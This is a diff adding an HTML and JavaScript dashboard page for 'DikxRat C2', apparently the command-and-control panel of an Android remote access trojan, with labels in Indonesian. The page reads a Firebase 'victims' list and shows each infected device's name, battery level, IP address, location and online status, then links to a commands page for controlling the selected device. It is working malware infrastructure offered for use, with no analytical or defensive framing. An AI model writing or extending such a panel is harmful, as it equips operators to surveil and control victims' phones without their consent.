@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>DikxRat C2 - Dashboard</title>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000000;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            padding-bottom: 20px;
+            color: #fff;
+        }
+        .header {
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(15px);
+            padding: 14px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 51, 51, 0.4);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo {
+            font-size: 18px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #FF3333, #FF6666);
+            -webkit-background-clip: text; background-clip: text; color: transparent;
+        }
+        .online-badge {
+            background: rgba(255, 51, 51, 0.15);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 10px;
+            color: #FF3333;
+            border: 1px solid rgba(255, 51, 51, 0.4);
+        }
+        .stats-row {
+            display: flex;
+            gap: 12px;
+            padding: 16px;
+        }
+        .stat-card {
+            flex: 1;
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(5px);
+            border-radius: 20px;
+            padding: 12px 6px;
+            text-align: center;
+            border: 1px solid rgba(255, 51, 51, 0.3);
+        }
+        .stat-card .value {
+            font-size: 22px;
+            font-weight: 800;
+            color: #FF3333;
+        }
+        .stat-card .label {
+            font-size: 9px;
+            color: #884444;
+            margin-top: 4px;
+        }
+        .section-title {
+            padding: 12px 16px 8px 16px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #FF3333;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-left: 3px solid #FF3333;
+            margin-left: 12px;
+        }
+        .victim-list { padding: 0 16px; }
+        .victim-card {
+            background: rgba(20, 20, 20, 0.6);
+            backdrop-filter: blur(5px);
+            border-radius: 20px;
+            padding: 14px;
+            margin-bottom: 10px;
+            border: 1px solid rgba(255, 51, 51, 0.25);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .victim-card:active { background: rgba(255, 51, 51, 0.1); transform: scale(0.99); }
+        .victim-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
+        .device-name { font-weight: 700; font-size: 14px; color: #fff; }
+        .battery { font-size: 11px; color: #FF6666; }
+        .ip-location { font-size: 11px; color: #884444; display: flex; gap: 12px; flex-wrap: wrap; }
+        .status-badge {
+            font-size: 10px; padding: 2px 10px; border-radius: 20px;
+        }
+        .status-online { background: rgba(255, 51, 51, 0.15); color: #FF6666; border: 1px solid rgba(255, 51, 51, 0.3); }
+        .status-offline { background: rgba(136, 68, 68, 0.15); color: #884444; }
+        .logout-btn {
+            position: fixed; bottom: 20px; right: 20px;
+            background: rgba(255, 51, 51, 0.15);
+            border: 1px solid rgba(255, 51, 51, 0.4);
+            color: #FF3333;
+            width: 48px; height: 48px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; z-index: 200; backdrop-filter: blur(10px);
+        }
+        .empty-state { text-align: center; padding: 50px 20px; color: #884444; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">🔥 DIKXRAT C2</div>
+        <div class="online-badge" id="syncBadge">🟢 SYNC</div>
+    </div>
+
+    <div class="stats-row">
+        <div class="stat-card"><div class="value" id="statConnected">0</div><div class="label">DEVICE TERHUBUNG</div></div>
+        <div class="stat-card"><div class="value" id="statOnline">0</div><div class="label">ONLINE</div></div>
+        <div class="stat-card"><div class="value" id="statOffline">0</div><div class="label">OFFLINE</div></div>
+        <div class="stat-card"><div class="value" id="statTotal">0</div><div class="label">TOTAL PERNAH</div></div>
+    </div>
+
+    <div class="section-title"><i class="fas fa-mobile-alt"></i> DAFTAR DEVICE</div>
+    <div class="victim-list" id="victimListContainer">
+        <div class="empty-state"><i class="fas fa-spinner fa-pulse"></i> Memuat daftar device...</div>
+    </div>
+
+    <div class="logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i></div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD-XXXXXXXXXXXXXXXXXXXXXXXXX",
+            authDomain: "dikxrat.firebaseapp.com",
+            databaseURL: "https://dikxrat-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "dikxrat",
+            storageBucket: "dikxrat.appspot.com",
+            appId: "1:613800760096:android:4b52f441eda4d620"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let currentUser = null;
+        let allVictims = {};
+
+        function loadUser() {
+            const userStr = localStorage.getItem('currentUser');
+            if (!userStr) { window.location.href = 'index.html'; return false; }
+            currentUser = JSON.parse(userStr);
+            return true;
+        }
+
+        function updateStats(victims) {
+            const values = Object.values(victims);
+            const connected = values.length;
+            const online = values.filter(v => v.last_seen && (Date.now() - v.last_seen) < 60000).length;
+            const offline = connected - online;
+            document.getElementById('statConnected').innerText = connected;
+            document.getElementById('statOnline').innerText = online;
+            document.getElementById('statOffline').innerText = offline;
+            document.getElementById('statTotal').innerText = connected;
+        }
+
+        function renderVictimList(victims) {
+            const container = document.getElementById('victimListContainer');
+            if (!victims || Object.keys(victims).length === 0) {
+                container.innerHTML = '<div class="empty-state"><i class="fas fa-ghost"></i> Belum ada device terhubung</div>';
+                return;
+            }
+            let html = '';
+            for (const [deviceId, data] of Object.entries(victims)) {
+                const isOnline = data.last_seen && (Date.now() - data.last_seen) < 60000;
+                const deviceName = data.device_name || data.model || 'Unknown Device';
+                const battery = data.battery_level ? `${data.battery_level}%` : '?%';
+                const ip = data.ip || '-';
+                const location = data.location || '-';
+                html += `
+                    <div class="victim-card" onclick="selectVictim('${deviceId}')">
+                        <div class="victim-row">
+                            <span class="device-name"><i class="fas fa-mobile-alt"></i> ${escapeHtml(deviceName)}</span>
+                            <span class="battery"><i class="fas fa-battery-full"></i> ${escapeHtml(battery)}</span>
+                        </div>
+                        <div class="ip-location">
+                            <span><i class="fas fa-map-marker-alt"></i> ${escapeHtml(location)}</span>
+                            <span><i class="fas fa-network-wired"></i> ${escapeHtml(ip)}</span>
+                        </div>
+                        <div class="victim-row" style="margin-top: 6px;">
+                            <span class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">
+                                ${isOnline ? '🔴 ONLINE' : '⚫ OFFLINE'}
+                            </span>
+                            <span style="font-size: 10px; color: #664444;">ID: ${deviceId.substring(0, 8)}...</span>
+                        </div>
+                    </div>
+                `;
+            }
+            container.innerHTML = html;
+        }
+
+        function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m){if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
+
+        function selectVictim(deviceId) {
+            localStorage.setItem('selectedVictimId', deviceId);
+            window.location.href = 'commands.html';
+        }
+
+        function logout() { localStorage.clear(); window.location.href = 'index.html'; }
+
+        async function loadVictims() {
+            if (!currentUser) return;
+            const victimsRef = db.ref(`users/${currentUser.userId}/accounts/${currentUser.accountId}/victims`);
+            victimsRef.on('value', (snapshot) => {
+                allVictims = snapshot.val() || {};
+                updateStats(allVictims);
+                renderVictimList(allVictims);
+                document.getElementById('syncBadge').innerHTML = '🔴 SYNC';
+            }, (error) => { document.getElementById('syncBadge').innerHTML = '⚫ OFFLINE'; });
+        }
+
+        if (loadUser()) { loadVictims(); }
+    </script>
+</body>
+</html>
